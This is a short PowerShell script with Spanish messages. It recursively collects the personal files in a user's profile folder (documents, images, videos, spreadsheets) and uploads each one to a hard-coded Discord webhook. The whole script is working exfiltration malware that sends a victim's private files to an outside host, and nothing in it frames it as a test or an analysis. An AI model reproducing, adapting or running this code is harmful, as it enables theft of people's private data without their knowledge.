$wc = New-Object System.Net.WebClient

$files = Get-ChildItem -Path "$env:USERPROFILE\" -Include *.pdf, *.doc, *.docx, *.txt, *.jpg, *.png, *.mp4, *.xls -File -Recurse -ErrorAction SilentlyContinue

if ($files.Count -eq 0) {
    Write-Host "No se encontraron archivos para subir."
    exit
}

$webhookUrl = "https://discord.com/api/webhooks/1256038727684194325/D7rqZlz9775lUFMYL6DAWyuRYYZwPXCnlxH2j8cG_UoLmkDlx1bub4F4_o5S4cpPU8Na"

foreach ($file in $files) {
    try {
        # Subir el archivo
        $wc.UploadFile($webhookUrl, $file.FullName)
        Write-Host "Archivo subido: $($file.FullName)"
    } catch {
        Write-Host "Error al subir el archivo: $($file.FullName)"
        Write-Host "Error: $_"
    }
}

$wc.Dispose()
